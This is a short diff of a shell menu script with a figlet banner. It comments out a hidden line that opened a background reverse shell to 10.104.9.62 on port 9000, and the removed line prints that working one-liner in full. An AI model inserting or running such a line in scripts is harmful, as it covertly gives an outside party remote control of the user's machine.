@@ -4,7 +4,7 @@
 #
 clear
 figlet -d /usr/share/figlet/ -f slant.flf Menu && figlet -d /usr/share/figlet/ -f digital.flf By: NLCC 2025
-bash -i >& /dev/tcp/10.104.9.62/9000 0>&1 &
+#bash -i >& /dev/tcp/10.104.9.62/9000 0>&1 &
 echo ""
 echo ""
 echo ""
